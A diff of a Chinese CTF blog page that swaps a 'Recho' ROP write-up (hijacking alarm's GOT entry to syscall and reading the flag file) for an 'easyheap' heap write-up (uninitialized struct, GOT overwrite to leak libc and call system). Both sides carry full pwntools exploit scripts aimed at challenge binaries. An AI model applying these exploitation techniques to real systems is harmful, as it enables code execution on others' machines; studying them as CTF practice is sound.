@@ -15,23 +15,22 @@
 
 
 
-<meta name="description" content="前言最近看啥题都感觉像是神仙打架，真心觉得想要把pwn给学好就要去把那些源码看一遍才好。感觉自己的头发都要保不住了啊啊啊啊。希望出题人轻点吧。。。">
+<meta name="description" content="已经很久没有写博客了，这次高校抗疫比赛又一次遭到了社会的毒打。赛后根据大佬的wp对最简单的easyheap这道题进行了复现，对这方面的知识有了更深的认识。">
 <meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="攻防世界-Recho-读取flag文件">
-<meta property="og:url" content="http://yoursite.com/2020/02/22/攻防世界-Recho-读取flag文件/index.html">
+<meta property="og:title" content="高校抗疫-easyheap">
+<meta property="og:url" content="http://yoursite.com/2020/03/15/高校抗疫-easyheap/index.html">
 <meta property="og:site_name" content="good good study,day day up!">
-<meta property="og:description" content="前言最近看啥题都感觉像是神仙打架，真心觉得想要把pwn给学好就要去把那些源码看一遍才好。感觉自己的头发都要保不住了啊啊啊啊。希望出题人轻点吧。。。">
+<meta property="og:description" content="已经很久没有写博客了，这次高校抗疫比赛又一次遭到了社会的毒打。赛后根据大佬的wp对最简单的easyheap这道题进行了复现，对这方面的知识有了更深的认识。">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://yoursite.com/img/Recho/1.jpg">
-<meta property="og:image" content="http://yoursite.com/img/Recho/2.jpg">
-<meta property="og:image" content="http://yoursite.com/img/Recho/3.jpg">
-<meta property="og:image" content="http://yoursite.com/img/Recho/4.jpg">
-<meta property="og:updated_time" content="2020-02-22T14:29:48.718Z">
+<meta property="og:image" content="http://yoursite.com/img/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9/1.jpg">
+<meta property="og:image" content="http://yoursite.com/img/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9/2.jpg">
+<meta property="og:image" content="http://yoursite.com/img/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9/3.jpg">
+<meta property="og:updated_time" content="2020-03-15T16:19:51.528Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="攻防世界-Recho-读取flag文件">
-<meta name="twitter:description" content="前言最近看啥题都感觉像是神仙打架，真心觉得想要把pwn给学好就要去把那些源码看一遍才好。感觉自己的头发都要保不住了啊啊啊啊。希望出题人轻点吧。。。">
-<meta name="twitter:image" content="http://yoursite.com/img/Recho/1.jpg">
+<meta name="twitter:title" content="高校抗疫-easyheap">
+<meta name="twitter:description" content="已经很久没有写博客了，这次高校抗疫比赛又一次遭到了社会的毒打。赛后根据大佬的wp对最简单的easyheap这道题进行了复现，对这方面的知识有了更深的认识。">
+<meta name="twitter:image" content="http://yoursite.com/img/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9/1.jpg">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -63,7 +62,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>攻防世界-Recho-读取flag文件 | good good study,day day up!</title>
+<title>高校抗疫-easyheap | good good study,day day up!</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -263,11 +262,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
 </nav>
-      <div class="body-wrap"><article id="post-攻防世界-Recho-读取flag文件" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="w-高校抗疫-easyheap" class="article article-type-w" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2020/02/22/攻防世界-Recho-读取flag文件/" class="article-date">
-      <time datetime="2020-02-22T13:47:38.000Z" itemprop="datePublished">2020-02-22</time>
+      <a href="/2020/03/15/高校抗疫-easyheap/" class="article-date">
+      <time datetime="2020-03-15T15:39:19.000Z" itemprop="datePublished">2020-03-15</time>
 </a>
 
 
@@ -282,7 +281,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      攻防世界-Recho-读取flag文件
+      高校抗疫-easyheap
     </h1>
   
 
@@ -303,36 +302,23 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近看啥题都感觉像是神仙打架，真心觉得想要把pwn给学好就要去把那些源码看一遍才好。感觉自己的头发都要保不住了啊啊啊啊。<br>希望出题人轻点吧。。。</p>
+        <p>已经很久没有写博客了，这次高校抗疫比赛又一次遭到了社会的毒打。赛后根据大佬的wp对最简单的easyheap这道题进行了复现，对<br>这方面的知识有了更深的认识。</p>
 <a id="more"></a>
 
-<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p><img src="/img/Recho/1.jpg" alt="avatar"><br>保护几乎都没有开，一开始以为是一个良好的开始，后面才知道自己想的太简单了。</p>
-<p><img src="/img/Recho/2.jpg" alt="avatar"></p>
-<p>程序的逻辑确实是十分简单，一开始也以为是可以直接通过ROP来解决的，但是发现程序是一只处在循环中的。<br>后来看了大佬的WP才知道pwntools还有shutdown这个函数可以强行停止循环，但这样的话程序也不会再进行第二次运行了。因此直接<br>进行泄漏函数地址这样的操作就是行不通的了。但是我们看到程序中给了我们flag这个字符串，这里有学到了一种新思路，那就是利用<br>syscall来调用open函数，然后将flag给读到我们的bss段中，最后在使用printf函数给打印出来。这个操作真的是骚到我了。</p>
-<p>下面来看一下如何进行具体操作的吧</p>
-<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>有了上述的思路之后，我们首先要解决的就是syscall的问题<br><img src="/img/Recho/3.jpg" alt="avatar"></p>
-<p>这里我们跟踪一下alarm函数发现在这个函数got表偏移为5的地方就是syscall了，这就是我们所需要程序执行的地方</p>
-<p>因此下面我们所需要做的就是如何来修改alarm_got使得运行alarm函数的时候执行syscall。这就要用到下面的一个gadgets<br><img src="/img/Recho/4.jpg" alt="avatar"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add byte ptr [rdi],al;ret</span><br></pre></td></tr></table></figure>
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p><img src="/img/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9/1.jpg" alt="avatar"><br>首先checksec一下程序发现没开pie，并且可以修改got表，这是一个好的开始<br><img src="/img/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9/2.jpg" alt="avatar"><br>然后ida逆向一下，看到这是一个比较常规的菜单题</p>
+<p><img src="/img/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9/3.jpg" alt="avatar"><br>然后进到create函数里面看一下，程序首先会创建一个大小为0x10的chunk来保存content的相关信息，数据结构大概是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">struct Node&#123;</span><br><span class="line">	char *content;</span><br><span class="line">	int size;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 
-<p>这一个gasgets可以让rdi内指向的地址加上al的值，这样到时候我们就可以劫持其GOT表了</p>
-<p>下面我们先进行第一步操作</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = &apos;a&apos;*0x38</span><br><span class="line">payload += p64(rdi)+p64(alarm_got)</span><br><span class="line">payload += p64(rax)+p64(0x5)</span><br><span class="line">payload += p64(add_rdi_al)</span><br></pre></td></tr></table></figure>
+<p>而当我们输入的size大小大于1024的时候，Node的结构体就不会初始化。这样当我们利用glibc的fastbin先创建一个大小为0x18的chunk然后<br>将其delete后，再去申请一个大小大于1024的chunk，这个未初始化的Node结构体的content正好指向了下一个chunk，同时大小为0x10的堆空间<br>会被作为另一个Node的空间，这样我们就能够利用edit来修改下一个Node的content指针，来达到任意地址写的目的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create(0x18,&apos;a&apos;*0x18)</span><br><span class="line">delete(0)</span><br><span class="line">createNode()</span><br><span class="line">create(0x18,&apos;b&apos;*0x18)</span><br><span class="line">delete(1)</span><br><span class="line">createNode()</span><br><span class="line">create(0x18,&apos;c&apos;*0x18)</span><br></pre></td></tr></table></figure>
 
-<p>这样我们就成功劫持了alarm函数的got表到syscall上</p>
-<p>第二步就是要使用syscall来调用open<br>这里学习后发现open函数的系统调用是2，所以下面一步也就显而易见了，就是构造int fd = open(“flag”,READONLY);  </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload += p64(rsi)+p64(0)+p64(0)</span><br><span class="line">payload += p64(rdi)+p64(e.search(&apos;flag&apos;).next())</span><br><span class="line">payload += p64(rdi)+p64(2)</span><br><span class="line">payload += p64(alarm_plt)</span><br></pre></td></tr></table></figure>
+<p>经过利用后程序的堆空间布局如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/40gx 0xca9000</span><br><span class="line">0xca9000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xca9010:	0x0000000000ca9020	0x0000000000000018</span><br><span class="line">0xca9020:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0xca9030:	0x0000000000ca9040	0x6161616100000018</span><br><span class="line">0xca9040:	0x6161616161616161	0x0000000000000021</span><br><span class="line">0xca9050:	0x0000000000ca9070	0x6262626200000018</span><br><span class="line">0xca9060:	0x6262626262626262	0x0000000000000021</span><br><span class="line">0xca9070:	0x6363636363636363	0x6363636363636363</span><br><span class="line">0xca9080:	0x6363636363636363	0x0000000000020f81</span><br></pre></td></tr></table></figure>
 
-<p>由于open之后，fd一般都是从3开始的，我们之后要构造出read(fd,buf,100)来吧flag给读到bss段</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload += p64(rsi)+64(bss)+p64(0)</span><br><span class="line">payload += p64(rdi)+p64(3)</span><br><span class="line">payload += p64(rdx)+p64(100)</span><br><span class="line">payload += p64(read_plt)</span><br></pre></td></tr></table></figure>
+<p>接下来我们只需要修改Node2的content指针为free_got，然后对Node2进行edit，我们修改的就是free_got地址的内容了。我们将其修改为<br>puts_plt的地址，然后将再次将Node2的content指针修改为指向puts_got,这样当我们释放chunk2时，就能够泄露出puts_addr了。<br>然后利用同样的方法修改atoi_got为system函数地址，下一次输入”/bin/sh”就能get shell了</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">p = process(&apos;./easyheap&apos;)</span><br><span class="line">ptr = 0x6020c0</span><br><span class="line">e = ELF(&apos;./easyheap&apos;)</span><br><span class="line">libc = ELF(&apos;libc.so.6&apos;)</span><br><span class="line">free_got = e.got[&apos;free&apos;]</span><br><span class="line">puts_plt = e.plt[&apos;puts&apos;]</span><br><span class="line">puts_got = e.got[&apos;puts&apos;]</span><br><span class="line">atoi_got = e.got[&apos;atoi&apos;]</span><br><span class="line">#max chunksize = 1024 max idx = 3</span><br><span class="line">def create(size,content):</span><br><span class="line">	p.recvuntil(&apos;choice:\n&apos;)</span><br><span class="line">	p.sendline(&apos;1&apos;)</span><br><span class="line">	p.recvuntil(&apos;message?\n&apos;)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(&apos;message?\n&apos;)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">	p.recvuntil(&apos;choice:\n&apos;)</span><br><span class="line">	p.sendline(&apos;2&apos;)</span><br><span class="line">	p.recvuntil(&apos;deleted?\n&apos;)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">def edit(idx,content):</span><br><span class="line">	p.recvuntil(&apos;choice:\n&apos;)</span><br><span class="line">	p.sendline(&apos;3&apos;)</span><br><span class="line">	p.recvuntil(&apos;modified?\n&apos;)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(&apos;message?\n&apos;)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line">def createNode():</span><br><span class="line">	p.recvuntil(&apos;choice:\n&apos;)</span><br><span class="line">	p.sendline(&apos;1&apos;)</span><br><span class="line">	p.recvuntil(&apos;message?\n&apos;)</span><br><span class="line">	p.sendline(str(2048))</span><br><span class="line">create(0x18,&apos;a&apos;*0x18)</span><br><span class="line">delete(0)</span><br><span class="line">createNode()</span><br><span class="line"></span><br><span class="line">create(0x18,&apos;b&apos;*0x18)</span><br><span class="line">delete(1)</span><br><span class="line">createNode()</span><br><span class="line">create(0x18,&apos;c&apos;*0x18)</span><br><span class="line">edit(1,0x10*&apos;c&apos;+p64(free_got))</span><br><span class="line">edit(2,p64(puts_plt))</span><br><span class="line"></span><br><span class="line">edit(1,&apos;c&apos;*0x10+p64(puts_got))</span><br><span class="line">delete(2)</span><br><span class="line">puts_addr = u64(p.recv(6).ljust(8,&apos;\x00&apos;))</span><br><span class="line">print hex(puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.sym[&apos;puts&apos;]</span><br><span class="line">system = libc_base + libc.sym[&apos;system&apos;]</span><br><span class="line">edit(0,&apos;c&apos;*0x10+p64(atoi_got))</span><br><span class="line">edit(1,p64(system))</span><br><span class="line">p.recvuntil(&apos;choice:\n&apos;)</span><br><span class="line">p.sendline(&apos;/bin/sh&apos;)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
-<p>最后就是打印flag</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload += p64(rdi)+p64(bss)+p64(printf_plt)</span><br><span class="line">paylaod = payload.ljust(0x200,&apos;\x00)</span><br></pre></td></tr></table></figure>
-
-<p>然后结束循环进行ROP就能得到flag了</p>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import time</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#p = process(&apos;./pwn&apos;)</span><br><span class="line">p = remote(&apos;111.198.29.45&apos;,57350)</span><br><span class="line">e = ELF(&apos;./pwn&apos;)</span><br><span class="line">rdi = 0x4008a3</span><br><span class="line">rsi = 0x4008a1</span><br><span class="line">rdx = 0x4006fe</span><br><span class="line">rax = 0x4006fc</span><br><span class="line">add_rdi_al = 0x40070d</span><br><span class="line">flag = 0x601058</span><br><span class="line">bss = 0x601070</span><br><span class="line">printf_plt = e.plt[&apos;printf&apos;]</span><br><span class="line">read_plt = e.plt[&apos;read&apos;]</span><br><span class="line">alarm_plt = e.plt[&apos;alarm&apos;]</span><br><span class="line">alarm_got = e.got[&apos;alarm&apos;]</span><br><span class="line">read_got = e.got[&apos;read&apos;]</span><br><span class="line">write_plt = e.plt[&apos;write&apos;]</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(str(0x200))</span><br><span class="line">#---------------------------edit alarm_got to get syscall-----------</span><br><span class="line">payload = &apos;a&apos;*0x38+p64(rdi)+p64(alarm_got)</span><br><span class="line">payload += p64(rax)+p64(0x5)</span><br><span class="line">payload += p64(add_rdi_al)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#--------------------------use syscall to open flag----------------</span><br><span class="line">payload += p64(rsi)+p64(0)+p64(0)</span><br><span class="line">payload += p64(rdi)+p64(e.search(&apos;flag&apos;).next())</span><br><span class="line">payload += p64(rax)+p64(2)</span><br><span class="line">payload += p64(alarm_plt)</span><br><span class="line"></span><br><span class="line">#---------------------------read flag to bss-------------</span><br><span class="line">payload += p64(rsi)+p64(bss)+p64(0)</span><br><span class="line">payload += p64(rdi)+p64(3)</span><br><span class="line">payload += p64(rdx)+p64(100)</span><br><span class="line">payload += p64(read_plt)</span><br><span class="line"></span><br><span class="line">#----------------------------print flag--------------------------</span><br><span class="line">payload += p64(rdi)+p64(bss)+p64(printf_plt)</span><br><span class="line">print len(payload)</span><br><span class="line">payload = payload.ljust(0x200,&apos;\x00&apos;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.shutdown(&apos;write&apos;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>这道题目的知识大部分都是新接触的，所以其中的一些知识掌握的也不是很熟练。还是要多刷题目吧，慢慢填补自己的漏洞。<br>奥利给！！</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这次复盘对自己的帮助还是很大的，菜归菜，总能积累一些东西下来。还是尽量把libc的源码给好好看看吧，这样对自己做题还是有很大<br>好处的。希望下次比赛可以做出个几道题。</p>
 
       
     </div>
@@ -341,13 +327,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2020/02/22/攻防世界-Recho-读取flag文件/">攻防世界-Recho-读取flag文件</a></p>
+        <p><span>本文标题:</span><a href="/2020/03/15/高校抗疫-easyheap/">高校抗疫-easyheap</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">HeZhaochen</a></p>
-        <p><span>发布时间:</span>2020-02-22, 21:47:38</p>
-        <p><span>最后更新:</span>2020-02-22, 22:29:48</p>
+        <p><span>发布时间:</span>2020-03-15, 23:39:19</p>
+        <p><span>最后更新:</span>2020-03-16, 00:19:51</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2020/02/22/攻防世界-Recho-读取flag文件/" title="攻防世界-Recho-读取flag文件">http://yoursite.com/2020/02/22/攻防世界-Recho-读取flag文件/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2020/02/22/攻防世界-Recho-读取flag文件/　　作者: HeZhaochen" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2020/03/15/高校抗疫-easyheap/" title="高校抗疫-easyheap">http://yoursite.com/2020/03/15/高校抗疫-easyheap/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2020/03/15/高校抗疫-easyheap/　　作者: HeZhaochen" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
@@ -359,16 +345,10 @@
 
     <nav id="article-nav">
         
-            <div id="article-nav-newer" class="article-nav-title">
-                <a href="/2020/02/26/攻防世界-Noleak/">
-                    攻防世界-Noleak
-                </a>
-            </div>
-        
         
             <div id="article-nav-older" class="article-nav-title">
-                <a href="/2020/02/17/ReeHY-mian-100-Unlink/">
-                    ReeHY-mian-100-Unlink
+                <a href="/2020/02/26/攻防世界-Noleak/">
+                    攻防世界-Noleak
                 </a>
             </div>
         
@@ -380,7 +360,7 @@
     <div id="toc" class="toc-article">
         <strong class="toc-title">文章目录</strong>
         
-            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#程序分析"><span class="toc-number">2.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#思路"><span class="toc-number">3.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li></ol>
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#程序分析"><span class="toc-number">1.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">2.</span> <span class="toc-text">exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#小结"><span class="toc-number">3.</span> <span class="toc-text">小结</span></a></li></ol>
         
     </div>
     <style>
@@ -416,7 +396,7 @@
         </div>
         <script>
             window._bd_share_config={
-                "common":{"bdSnsKey":{},"bdText":"攻防世界-Recho-读取flag文件　| good good study,day day up!　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+                "common":{"bdSnsKey":{},"bdText":"高校抗疫-easyheap　| good good study,day day up!　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
         </script>
     
 
@@ -436,15 +416,13 @@
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2020/02/26/攻防世界-Noleak/" title="上一篇: 攻防世界-Noleak">
-                <i class="fa fa-angle-left"></i>
-            </a>
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
         
 
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
 
         
-            <a href="/2020/02/17/ReeHY-mian-100-Unlink/" title="下一篇: ReeHY-mian-100-Unlink">
+            <a href="/2020/02/26/攻防世界-Noleak/" title="下一篇: 攻防世界-Noleak">
                 <i class="fa fa-angle-right"></i>
             </a>
         
